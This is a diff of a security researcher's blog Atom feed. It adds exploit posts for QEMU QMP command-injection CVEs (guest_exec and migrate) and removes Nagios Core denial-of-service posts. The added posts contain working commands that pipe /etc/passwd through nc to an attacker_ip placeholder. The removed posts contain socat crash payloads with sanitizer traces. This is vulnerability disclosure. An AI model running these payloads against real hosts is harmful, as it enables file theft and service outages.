@@ -1,4 +1,39 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-04-18T10:24:29+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><subtitle>Personal blog.</subtitle><entry><title type="html">[CVE-2019-5008] QEMU sun4u Denial of Service</title><link href="http://localhost:4000/posts/2019/01/03/CVE-2019-5008/" rel="alternate" type="text/html" title="[CVE-2019-5008] QEMU sun4u Denial of Service" /><published>2019-01-03T00:00:00+08:00</published><updated>2019-01-03T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/01/03/CVE-2019-5008</id><content type="html" xml:base="http://localhost:4000/posts/2019/01/03/CVE-2019-5008/">&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-06-24T11:55:23+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><subtitle>Personal blog.</subtitle><entry><title type="html">[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title><link href="http://localhost:4000/posts/2019/06/06/CVE-2019-12929/" rel="alternate" type="text/html" title="[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution" /><published>2019-06-06T00:00:00+08:00</published><updated>2019-06-06T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/06/06/CVE-2019-12929</id><content type="html" xml:base="http://localhost:4000/posts/2019/06/06/CVE-2019-12929/">&lt;p&gt;Exploit Title: QEMU Guest Agent guest_exec Command Execution&lt;br /&gt;
+Date: 2019-06-06&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.qemu.org/&lt;br /&gt;
+Software Link: https://www.qemu.org/download/&lt;br /&gt;
+Version: 4.0.0 and earlier&lt;br /&gt;
+Tested on: 4.0.0&lt;br /&gt;
+CVE: CVE-2019-12929&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;guest_exec&lt;/code&gt; command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
+
+&lt;p&gt;1st, execute the QEMU Guest Agent service&lt;br /&gt;
+2nd, open another console and setup a listener to port 9999&lt;br /&gt;
+3rd, connect to the target and enter the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{'execute':'guest-exec','arguments':{'path':'/bin/bash','arg': ['-c', 'cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999']}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: QEMU Guest Agent guest_exec Command Execution Date: 2019-06-06 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.qemu.org/ Software Link: https://www.qemu.org/download/ Version: 4.0.0 and earlier Tested on: 4.0.0 CVE: CVE-2019-12929</summary></entry><entry><title type="html">[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution</title><link href="http://localhost:4000/posts/2019/06/05/CVE-2019-12928/" rel="alternate" type="text/html" title="[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution" /><published>2019-06-05T00:00:00+08:00</published><updated>2019-06-05T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/06/05/CVE-2019-12928</id><content type="html" xml:base="http://localhost:4000/posts/2019/06/05/CVE-2019-12928/">&lt;p&gt;Exploit Title: QEMU Machine Protocol Migrate Command Execution&lt;br /&gt;
+Date: 2019-06-05&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.qemu.org/&lt;br /&gt;
+Software Link: https://www.qemu.org/download/&lt;br /&gt;
+Version: 4.0.0 and earlier&lt;br /&gt;
+Tested on: 4.0.0&lt;br /&gt;
+CVE: CVE-2019-12928&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt; command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
+
+&lt;p&gt;1st, execute the QEMU with &lt;code class=&quot;highlighter-rouge&quot;&gt;-qmp tcp:&amp;lt;ip_address&amp;gt;:1234,server,nowait&lt;/code&gt;&lt;br /&gt;
+2nd, open another console and setup a listener to port 9999&lt;br /&gt;
+3rd, connect to the target and enter the following commands:&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ &quot;execute&quot;: &quot;qmp_capabilities&quot; }
+{&quot;return&quot;: {}}
+{ &quot;execute&quot;: &quot;migrate&quot;, &quot;arguments&quot;: { &quot;uri&quot;: &quot;exec:cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999&quot; } }
+{&quot;return&quot;: {}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: QEMU Machine Protocol Migrate Command Execution Date: 2019-06-05 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.qemu.org/ Software Link: https://www.qemu.org/download/ Version: 4.0.0 and earlier Tested on: 4.0.0 CVE: CVE-2019-12928</summary></entry><entry><title type="html">[CVE-2019-5008] QEMU sun4u Denial of Service</title><link href="http://localhost:4000/posts/2019/01/03/CVE-2019-5008/" rel="alternate" type="text/html" title="[CVE-2019-5008] QEMU sun4u Denial of Service" /><published>2019-01-03T00:00:00+08:00</published><updated>2019-01-03T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/01/03/CVE-2019-5008</id><content type="html" xml:base="http://localhost:4000/posts/2019/01/03/CVE-2019-5008/">&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.&lt;/p&gt;
 
 &lt;p&gt;Affected code:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/hw/sparc64/sun4u.c b/hw/sparc64/sun4u.c
@@ -1251,47 +1286,4 @@ User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows&lt
     &quot;user-agent&quot;: null,
     &quot;watch&quot;: false
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped was a Bash file containing following commands:</summary></entry><entry><title type="html">[CVE-2018-13441] Nagios Core qh_help Denial of Service</title><link href="http://localhost:4000/posts/2018/07/09/CVE-2018-13441/" rel="alternate" type="text/html" title="[CVE-2018-13441] Nagios Core qh_help Denial of Service" /><published>2018-07-09T00:00:00+08:00</published><updated>2018-07-09T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/09/CVE-2018-13441</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/09/CVE-2018-13441/">&lt;p&gt;Exploit Title: Nagios Core qh_help Denial of Service&lt;br /&gt;
-Date: 2018-07-09&lt;br /&gt;
-Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
-Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
-Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
-Version: 4.4.1 and earlier&lt;br /&gt;
-Tested on: 4.4.1&lt;br /&gt;
-CVE : CVE-2018-13441&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;qh_help in Nagios Core version 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attacker to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne “#help\0&quot; | socat unix-connect:./poc/nagios.qh -
-$ echo -ne “@help\0&quot; | socat unix-connect:./poc/nagios.qh -
-
-#0 0x554fef in qh_help /home/user/nagioscore/base/query-handler.c:374:7
-#1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12
-#2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4
-#3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12
-#4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4
-#5 0x7f61587ae82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
-#6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: Nagios Core qh_help Denial of Service Date: 2018-07-09 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.nagios.org/ Software Link: https://www.nagios.org/downloads/nagios-core/ Version: 4.4.1 and earlier Tested on: 4.4.1 CVE : CVE-2018-13441</summary></entry><entry><title type="html">[CVE-2018-13457] Nagios Core qh_echo Denial of Service</title><link href="http://localhost:4000/posts/2018/07/09/CVE-2018-13457/" rel="alternate" type="text/html" title="[CVE-2018-13457] Nagios Core qh_echo Denial of Service" /><published>2018-07-09T00:00:00+08:00</published><updated>2018-07-09T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/09/CVE-2018-13457</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/09/CVE-2018-13457/">&lt;p&gt;Exploit Title: Nagios Core qh_echo Denial of Service&lt;br /&gt;
-Date: 2018-07-09&lt;br /&gt;
-Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
-Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
-Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
-Version: 4.4.1 and earlier&lt;br /&gt;
-Tested on: 4.4.1&lt;br /&gt;
-CVE : CVE-2018-13457&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo -ne &quot;#echo\0&quot; | socat unix-connect:./poc/nagios.qh -
-$ echo -ne “@echo\0&quot; | socat unix-connect:./poc/nagios.qh -
-
-#0 0x4cb18b in __interceptor_strcmp.part.60 /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:422
-#1 0x554e98 in qh_echo /home/user/nagioscore/base/query-handler.c:29:7
-#2 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12
-#3 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4
-#4 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12
-#5 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4
-#6 0x7f183c5f782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
-#7 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Exploit Title: Nagios Core qh_echo Denial of Service Date: 2018-07-09 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.nagios.org/ Software Link: https://www.nagios.org/downloads/nagios-core/ Version: 4.4.1 and earlier Tested on: 4.4.1 CVE : CVE-2018-13457</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped was a Bash file containing following commands:</summary></entry></feed>
